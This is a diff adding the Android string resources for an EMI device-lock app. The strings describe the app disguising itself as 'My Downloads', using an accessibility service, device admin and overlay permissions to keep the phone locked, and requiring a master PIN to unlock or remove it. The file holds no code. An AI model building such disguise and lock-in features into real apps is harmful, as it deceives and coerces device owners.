@@ -1,0 +1,39 @@
+<resources>
+    <string name="app_name">My Downloads</string>
+    <string name="lock_message">This device is locked due to pending EMI.</string>
+    <string name="enter_pin">Enter Master PIN</string>
+    <string name="unlock">Unlock</string>
+    <string name="emergency_call">Emergency Call</string>
+    <string name="accessibility_service_description">This service is required to keep the device locked when EMI is pending. Please enable it for proper functionality.</string>
+    <string name="downloads_label">My Downloads</string>
+    
+    <!-- UI Strings -->
+    <string name="device_controller">Device Controller</string>
+    <string name="enterprise_management">Enterprise Management</string>
+    <string name="current_status">Current Status</string>
+    <string name="not_protected">Not Protected</string>
+    <string name="protected_status">Protected</string>
+    <string name="ready_to_protect">Ready to Protect</string>
+    <string name="enter_device_id">Enter Device ID</string>
+    
+    <!-- Permissions -->
+    <string name="device_admin">Device Admin</string>
+    <string name="accessibility_service">Accessibility Service</string>
+    <string name="display_overlay">Display Overlay</string>
+    <string name="grant">Grant</string>
+    <string name="granted">Granted</string>
+    
+    <!-- Actions -->
+    <string name="save_device_id">Save Device ID</string>
+    <string name="check_status">Check Status</string>
+    <string name="add_protection">Add Protection</string>
+    <string name="remove_protection">Remove Protection</string>
+    
+    <!-- Dialogs -->
+    <string name="protection_added_title">🛡️ Protection Added</string>
+    <string name="protection_added_message">Device is now protected. The app will now disguise as \'My Downloads\'.</string>
+    <string name="protection_removed_title">✅ Protection Removed</string>
+    <string name="protection_removed_message">Device protection has been disabled. You can now uninstall the app from Settings.</string>
+    <string name="remove_protection_title">🔐 Remove Protection</string>
+    <string name="enter_master_pin">Enter Master PIN to remove protection:</string>
+</resources>
